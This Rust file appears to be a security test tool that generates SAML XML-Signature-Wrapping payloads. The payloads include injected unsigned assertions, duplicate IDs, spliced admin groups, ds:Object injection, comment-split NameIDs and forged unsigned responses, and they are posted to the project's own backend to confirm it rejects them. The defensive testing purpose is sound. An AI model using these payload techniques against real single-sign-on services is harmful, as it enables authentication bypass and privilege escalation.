//! DTF brick 5 (sso) — SAML XML-Signature-Wrapping (XSW) payload generator.
//!
//! Emits base64 `SAMLResponse` documents for the sso tier oracle to POST to the
//! backend's real ACS route (`/api/v1/auth/sso/saml/{id}/acs`). The signing key
//! is an ephemeral per-run RSA-2048 keypair; its self-signed cert is registered
//! as the SAML provider `certificate`, so the backend verifies with the exact
//! key we sign with (via `bergshamra`, the same crate the backend uses).
//!
//! The signer + `SamlResponseSpec` + XSW crafting are vendored verbatim from
//! `backend/tests/common/sso_support.rs` (the source of truth these payloads
//! must match) and `rig/harness/pool_xsw_probe.rs`. This binary depends only on
//! crates.io deps (NOT the backend crate) so it builds standalone and fast.
//!
//! CLI:
//!   keygen <outdir>                       -> writes idp_key.pem + idp_cert.pem
//!   craft --key <pem> --issuer <e> --audience <a> --request-id <rid>
//!         --name-id <nid> --case <case> [--groups g1,g2]
//!         [--attacker-name-id <nid>] [--admin-group <g>]
//!     -> prints one base64 `SAMLResponse` line to stdout
//!
//! cases: positive | xsw_dual | xsw_dup_id | xsw_attr_before | xsw_attr_after
//!        | xsw_ds_object | xsw_nameid_comment | forged_unsigned

use std::collections::HashMap;

use bergshamra::keys::loader::load_rsa_private_pem;
use bergshamra::{sign, DsigContext, KeysManager};

// ===========================================================================
// Ephemeral self-signed IdP identity (vendored from sso_support.rs)
// ===========================================================================

fn der_len(len: usize) -> Vec<u8> {
    assert!(len < 0x1_0000, "DER length out of supported range");
    if len < 0x80 {
        vec![len as u8]
    } else if len < 0x100 {
        vec![0x81, len as u8]
    } else {
        vec![0x82, (len >> 8) as u8, len as u8]
    }
}

fn der_tlv(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    out.extend(der_len(content.len()));
    out.extend_from_slice(content);
    out
}

fn der_sha256_rsa_alg_id() -> Vec<u8> {
    let oid = der_tlv(0x06, &[0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b]);
    let null = der_tlv(0x05, &[]);
    der_tlv(0x30, &[oid, null].concat())
}

fn der_cn_name(cn: &str) -> Vec<u8> {
    let oid_cn = der_tlv(0x06, &[0x55, 0x04, 0x03]);
    let value = der_tlv(0x0c, cn.as_bytes());
    let atv = der_tlv(0x30, &[oid_cn, value].concat());
    let rdn = der_tlv(0x31, &atv);
    der_tlv(0x30, &rdn)
}

fn self_signed_cert_pem(key: &rsa::RsaPrivateKey) -> String {
    use rsa::pkcs8::EncodePublicKey;
    use rsa::sha2::{Digest, Sha256};

    let spki_der = key
        .to_public_key()
        .to_public_key_der()
        .expect("encode SPKI DER");

    let serial = der_tlv(0x02, &[0x01]);
    let alg_id = der_sha256_rsa_alg_id();
    let name = der_cn_name("ak-dtf-saml-ephemeral-idp");
    let validity = der_tlv(
        0x30,
        &[
            der_tlv(0x17, b"200101000000Z"),
            der_tlv(0x17, b"491231235959Z"),
        ]
        .concat(),
    );

    let tbs = der_tlv(
        0x30,
        &[
            serial,
            alg_id.clone(),
            name.clone(),
            validity,
            name,
            spki_der.as_bytes().to_vec(),
        ]
        .concat(),
    );

    let digest = Sha256::digest(&tbs);
    let signature = key
        .sign(rsa::Pkcs1v15Sign::new::<Sha256>(), &digest)
        .expect("self-sign certificate");
    let mut bitstring_content = vec![0x00];
    bitstring_content.extend_from_slice(&signature);
    let sig_bits = der_tlv(0x03, &bitstring_content);

    let cert_der = der_tlv(0x30, &[tbs, alg_id, sig_bits].concat());
    pem_wrap("CERTIFICATE", &cert_der)
}

fn pem_wrap(label: &str, der: &[u8]) -> String {
    let b64 = base64_standard(der);
    let mut out = format!("-----BEGIN {label}-----\n");
    for chunk in b64.as_bytes().chunks(64) {
        out.push_str(std::str::from_utf8(chunk).expect("base64 is ascii"));
        out.push('\n');
    }
    out.push_str(&format!("-----END {label}-----\n"));
    out
}

fn base64_standard(bytes: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(bytes)
}

fn xml_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&apos;")
}

// ===========================================================================
// Signer (vendored from sso_support.rs)
// ===========================================================================

fn sign_saml_document_with_key(pkcs8_pem: &[u8], template_xml: &str) -> String {
    let key = load_rsa_private_pem(pkcs8_pem).expect("load RSA signing key");
    let mut km = KeysManager::new();
    km.add_key(key);
    let ctx = DsigContext::new(km);
    sign(&ctx, template_xml).expect("sign SAML document")
}

// ===========================================================================
// SamlResponseSpec (vendored from sso_support.rs)
// ===========================================================================

struct SamlResponseSpec {
    issuer: String,
    audience: String,
    in_response_to: Option<String>,
    name_id: String,
    email: String,
    display_name: String,
    groups: Vec<String>,
    destination: Option<String>,
    recipient: Option<String>,
    key_pem: Vec<u8>,
}

impl SamlResponseSpec {
    fn new(issuer: &str, audience: &str, in_response_to: &str, name_id: &str, key_pem: Vec<u8>) -> Self {
        Self {
            issuer: issuer.to_string(),
            audience: audience.to_string(),
            in_response_to: Some(in_response_to.to_string()),
            name_id: name_id.to_string(),
            email: format!("{name_id}@saml-e2e.test"),
            display_name: "SAML DTF User".to_string(),
            groups: vec!["Developers".to_string()],
            destination: None,
            recipient: None,
            key_pem,
        }
    }

    fn sign(&self, template: &str) -> String {
        sign_saml_document_with_key(&self.key_pem, template)
    }

    fn to_unsigned_xml(&self) -> String {
        let now = chrono::Utc::now();
        let issue_instant = now.format("%Y-%m-%dT%H:%M:%SZ");
        let not_before = (now - chrono::Duration::minutes(5)).format("%Y-%m-%dT%H:%M:%SZ");
        let not_on_or_after = (now + chrono::Duration::minutes(5)).format("%Y-%m-%dT%H:%M:%SZ");
        let response_id = format!("_resp{}", uuid::Uuid::new_v4().as_simple());
        let assertion_id = format!("_assertion{}", uuid::Uuid::new_v4().as_simple());
        let session_index = format!("_sess{}", uuid::Uuid::new_v4().as_simple());

        let in_response_to_attr = self
            .in_response_to
            .as_deref()
            .map(|v| format!(" InResponseTo=\"{}\"", xml_escape(v)))
            .unwrap_or_default();
        let destination_attr = self
            .destination
            .as_deref()
            .map(|v| format!(" Destination=\"{}\"", xml_escape(v)))
            .unwrap_or_default();
        let recipient_attr = self
            .recipient
            .as_deref()
            .map(|v| format!(" Recipient=\"{}\"", xml_escape(v)))
            .unwrap_or_default();
        let group_values = self
            .groups
            .iter()
            .map(|g| format!("<saml:AttributeValue>{}</saml:AttributeValue>", xml_escape(g)))
            .collect::<String>();
        let groups_attribute = if self.groups.is_empty() {
            String::new()
        } else {
            format!(r#"<saml:Attribute Name="groups">{group_values}</saml:Attribute>"#)
        };

        format!(
            r##"<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="{response_id}"{in_response_to_attr}{destination_attr}
                Version="2.0" IssueInstant="{issue_instant}">
    <saml:Issuer>{issuer}</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    <saml:Assertion ID="{assertion_id}" Version="2.0" IssueInstant="{issue_instant}">
        <saml:Issuer>{issuer}</saml:Issuer>
        <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
            <ds:SignedInfo>
                <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
                <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
                <ds:Reference URI="#{assertion_id}">
                    <ds:Transforms>
                        <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
                        <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
                    </ds:Transforms>
                    <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
                    <ds:DigestValue></ds:DigestValue>
                </ds:Reference>
            </ds:SignedInfo>
            <ds:SignatureValue></ds:SignatureValue>
        </ds:Signature>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{name_id}</saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData{recipient_attr} NotOnOrAfter="{not_on_or_after}"/>
            </saml:SubjectConfirmation>
        </saml:Subject>
        <saml:Conditions NotBefore="{not_before}" NotOnOrAfter="{not_on_or_after}">
            <saml:AudienceRestriction>
                <saml:Audience>{audience}</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement SessionIndex="{session_index}" AuthnInstant="{issue_instant}"/>
        <saml:AttributeStatement>
            <saml:Attribute Name="email">
                <saml:AttributeValue>{email}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="displayName">
                <saml:AttributeValue>{display_name}</saml:AttributeValue>
            </saml:Attribute>
            {groups_attribute}
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>"##,
            issuer = xml_escape(&self.issuer),
            audience = xml_escape(&self.audience),
            name_id = xml_escape(&self.name_id),
            email = xml_escape(&self.email),
            display_name = xml_escape(&self.display_name),
        )
    }

    fn signed_b64(&self) -> String {
        base64_standard(self.sign(&self.to_unsigned_xml()).as_bytes())
    }

    /// Fully-unsigned forged response (no valid signature at all). With
    /// require_signed_assertions=true this must be rejected outright.
    fn forged_unsigned_b64(&self) -> String {
        // Strip the ds:Signature block so nothing is signed.
        let xml = self.to_unsigned_xml();
        let start = xml.find("<ds:Signature").unwrap();
        let end = xml.find("</ds:Signature>").unwrap() + "</ds:Signature>".len();
        let stripped = format!("{}{}", &xml[..start], &xml[end..]);
        base64_standard(stripped.as_bytes())
    }

    /// Dual-assertion / duplicate-ID XSW (#2449): legit signed benign assertion
    /// + appended UNSIGNED assertion carrying attacker NameID + admin groups.
    fn xsw_wrapped_b64(&self, attacker_name_id: &str, attacker_groups: &[String], dup_id: bool) -> String {
        let signed = self.sign(&self.to_unsigned_xml());
        let signed_assertion_id = signed
            .split("<saml:Assertion ID=\"")
            .nth(1)
            .and_then(|s| s.split('"').next())
            .unwrap_or("_signed")
            .to_string();
        let injected_id = if dup_id {
            signed_assertion_id
        } else {
            format!("_xsw{}", uuid::Uuid::new_v4().as_simple())
        };

        let now = chrono::Utc::now();
        let issue_instant = now.format("%Y-%m-%dT%H:%M:%SZ");
        let not_before = (now - chrono::Duration::minutes(5)).format("%Y-%m-%dT%H:%M:%SZ");
        let not_on_or_after = (now + chrono::Duration::minutes(5)).format("%Y-%m-%dT%H:%M:%SZ");
        let group_values = attacker_groups
            .iter()
            .map(|g| format!("<saml:AttributeValue>{}</saml:AttributeValue>", xml_escape(g)))
            .collect::<String>();

        let injected = format!(
            r##"<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="{injected_id}" Version="2.0" IssueInstant="{issue_instant}">
        <saml:Issuer>{issuer}</saml:Issuer>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{name_id}</saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData NotOnOrAfter="{not_on_or_after}"/>
            </saml:SubjectConfirmation>
        </saml:Subject>
        <saml:Conditions NotBefore="{not_before}" NotOnOrAfter="{not_on_or_after}">
            <saml:AudienceRestriction>
                <saml:Audience>{audience}</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement AuthnInstant="{issue_instant}"/>
        <saml:AttributeStatement>
            <saml:Attribute Name="email">
                <saml:AttributeValue>{name_id}@attacker.test</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="groups">{group_values}</saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>"##,
            issuer = xml_escape(&self.issuer),
            audience = xml_escape(&self.audience),
            name_id = xml_escape(attacker_name_id),
        );

        let wrapped = signed.replacen(
            "</samlp:Response>",
            &format!("{injected}\n</samlp:Response>"),
            1,
        );
        base64_standard(wrapped.as_bytes())
    }

    /// Attribute-injection XSW (#2453): a `groups` attribute spliced as a
    /// `<Response>` child outside the signed subtree (before/after assertion).
    fn attribute_xsw_b64(&self, attacker_groups: &[String], before_assertion: bool) -> String {
        let signed = self.sign(&self.to_unsigned_xml());
        let values = attacker_groups
            .iter()
            .map(|g| format!("<saml:AttributeValue>{}</saml:AttributeValue>", xml_escape(g)))
            .collect::<String>();
        let injected = format!(
            r#"<saml:Attribute xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Name="groups">{values}</saml:Attribute>"#
        );
        let wrapped = if before_assertion {
            signed.replacen("<saml:Assertion ", &format!("{injected}\n    <saml:Assertion "), 1)
        } else {
            signed.replacen("</saml:Assertion>", &format!("</saml:Assertion>\n    {injected}"), 1)
        };
        base64_standard(wrapped.as_bytes())
    }

    /// In-`<ds:Signature>` `<ds:Object>` injection (#2453 layer-3).
    fn ds_object_groups_injection_b64(&self, attacker_groups: &[String]) -> String {
        let signed = self.sign(&self.to_unsigned_xml());
        let values = attacker_groups
            .iter()
            .map(|g| format!("<saml:AttributeValue>{}</saml:AttributeValue>", xml_escape(g)))
            .collect::<String>();
        let injected = format!(
            r#"<ds:Object><saml:Attribute xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Name="groups">{values}</saml:Attribute></ds:Object>"#
        );
        let wrapped = signed.replacen("</ds:Signature>", &format!("{injected}</ds:Signature>"), 1);
        base64_standard(wrapped.as_bytes())
    }

    /// Comment-split NameID (#2453 / Case-5).
    fn nameid_comment_b64(&self) -> String {
        let signed = self.sign(&self.to_unsigned_xml());
        let escaped = xml_escape(&self.name_id);
        let split = escaped.rfind('-').map(|i| i + 1).unwrap_or_else(|| {
            let mut m = escaped.len() / 2;
            while m < escaped.len() && !escaped.is_char_boundary(m) {
                m += 1;
            }
            m
        });
        let (first_half, second_half) = escaped.split_at(split);
        let wrapped = signed.replacen(
            &format!("{escaped}</saml:NameID>"),
            &format!("{first_half}<!--c-->{second_half}</saml:NameID>"),
            1,
        );
        base64_standard(wrapped.as_bytes())
    }
}

// ===========================================================================
// CLI
// ===========================================================================

fn arg(map: &HashMap<String, String>, k: &str) -> String {
    map.get(k)
        .unwrap_or_else(|| panic!("missing required --{k}"))
        .clone()
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        eprintln!("usage: dtf-saml-xsw-probe <keygen|craft> ...");
        std::process::exit(2);
    }

    match args[1].as_str() {
        "keygen" => {
            let outdir = args.get(2).expect("keygen <outdir>");
            use rsa::pkcs8::EncodePrivateKey;
            let mut rng = rand_core::OsRng;
            let private = rsa::RsaPrivateKey::new(&mut rng, 2048).expect("generate RSA-2048 IdP key");
            let key_pem = private
                .to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
                .expect("encode PKCS#8 PEM")
                .to_string();
            let cert_pem = self_signed_cert_pem(&private);
            std::fs::write(format!("{outdir}/idp_key.pem"), &key_pem).expect("write key");
            std::fs::write(format!("{outdir}/idp_cert.pem"), &cert_pem).expect("write cert");
            println!("{outdir}/idp_cert.pem");
        }
        "craft" => {
            // parse --flag value pairs
            let mut m: HashMap<String, String> = HashMap::new();
            let mut i = 2;
            while i + 1 < args.len() {
                if let Some(flag) = args[i].strip_prefix("--") {
                    m.insert(flag.to_string(), args[i + 1].clone());
                    i += 2;
                } else {
                    i += 1;
                }
            }
            let key_pem = std::fs::read(arg(&m, "key")).expect("read signing key");
            let case = arg(&m, "case");
            let mut spec = SamlResponseSpec::new(
                &arg(&m, "issuer"),
                &arg(&m, "audience"),
                &arg(&m, "request-id"),
                &arg(&m, "name-id"),
                key_pem,
            );
            // optional groups on the signed assertion
            if let Some(g) = m.get("groups") {
                spec.groups = if g.is_empty() {
                    vec![]
                } else {
                    g.split(',').map(|s| s.to_string()).collect()
                };
            }
            let admin_groups: Vec<String> = m
                .get("admin-group")
                .map(|g| vec![g.clone()])
                .unwrap_or_else(|| vec!["ak-admins".to_string()]);
            let attacker = m
                .get("attacker-name-id")
                .cloned()
                .unwrap_or_else(|| "xsw-attacker".to_string());

            let out = match case.as_str() {
                "positive" => spec.signed_b64(),
                "forged_unsigned" => spec.forged_unsigned_b64(),
                "xsw_dual" => spec.xsw_wrapped_b64(&attacker, &admin_groups, false),
                "xsw_dup_id" => spec.xsw_wrapped_b64(&attacker, &admin_groups, true),
                "xsw_attr_before" => spec.attribute_xsw_b64(&admin_groups, true),
                "xsw_attr_after" => spec.attribute_xsw_b64(&admin_groups, false),
                "xsw_ds_object" => spec.ds_object_groups_injection_b64(&admin_groups),
                "xsw_nameid_comment" => spec.nameid_comment_b64(),
                other => {
                    eprintln!("unknown case: {other}");
                    std::process::exit(2);
                }
            };
            println!("{out}");
        }
        other => {
            eprintln!("unknown subcommand: {other}");
            std::process::exit(2);
        }
    }
}
